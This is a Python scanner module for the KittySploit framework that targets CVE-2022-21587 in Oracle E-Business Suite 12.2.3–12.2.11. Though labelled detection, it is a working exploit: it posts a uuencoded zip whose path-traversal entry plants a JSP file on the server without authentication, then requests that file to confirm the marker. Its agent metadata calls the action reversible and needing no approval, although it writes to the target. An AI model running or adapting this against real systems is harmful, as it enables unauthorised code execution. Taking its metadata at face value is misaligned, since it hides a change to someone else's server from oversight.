#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Oracle E-Business Suite 12."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle E-Business Suite 12.2.3 -12.2.11 - Remote Code Execution Detection',
        'description': 'Oracle E-Business Suite 12.2.3 through 12.2.11 is susceptible to remote code execution via the Oracle Web Applications Desktop Integrator product, Upload component. An attacker with HTTP network access can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'intrusive', 'ebs', 'unauth', 'kev', 'rce', 'oast', 'oracle', 'packetstorm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/',
            'https://www.oracle.com/security-alerts/cpuoct2022.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-21587',
            'http://packetstormsecurity.com/files/171208/Oracle-E-Business-Suite-EBS-Unauthenticated-Arbitrary-File-Upload.html',
            'https://github.com/manas3c/CVE-POC',
        ],
        'cve': 'CVE-2022-21587',
    }

    def run(self):
        path = '/OA_HTML/BneOfflineLOVService?bne:uueupload=true'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryZsMro0UsAQYLDZGv'}, data='------WebKitFormBoundaryZsMro0UsAQYLDZGv\nContent-Disposition: form-data; name="bne:uueupload"\n\nTRUE\n------WebKitFormBoundaryZsMro0UsAQYLDZGv\nContent-Disposition: form-data; name="uploadfilename";filename="taintedlove.zip"\n\nbegin 644 taintedlove.zip\nM4$L#!!0``````$1QRUK1ELZ-30```$T```!*````+BXO+BXO+BXO+BXO+BXO\nM1DU77TAO;64O3W)A8VQE7T5"4RUA<\'`Q+V%P<&QI8V%T:6]N<R]F;W)M<R]F\nM;W)M<R]T86EN="YJ<W!C870@/B!T86EN="YJ<W`*/"4*("`@(&]U="YP<FEN\nM="@B,#8Q96$S,#8M-#9E9BTQ,68P+6%D.30M9C-D,3@S8C`V.#EA(BD["B4^\nM"E!+`0(4`Q0``````$1QRUK1ELZ-30```$T```!*``````````````"D@0``\nM```N+B\\N+B\\N+B\\N+B\\N+B]&35=?2&]M92]/<F%C;&5?14)3+6%P<#$O87!P\nM;&EC871I;VYS+V9O<FUS+V9O<FUS+W1A:6YT+FIS<%!+!08``````0`!`\'@`\n(``"U````````\n`\nend\n------WebKitFormBoundaryZsMro0UsAQYLDZGv--\n')
        if not r:
            return False
        path = '/forms/taint.jsp'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('061ea306-46ef-11f0-ad94-f3d183b0689a',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='Oracle E-Business Suite 12.2.3 -12.2.11 - Remote Code Execution detected', path=path)
            return True
        return False

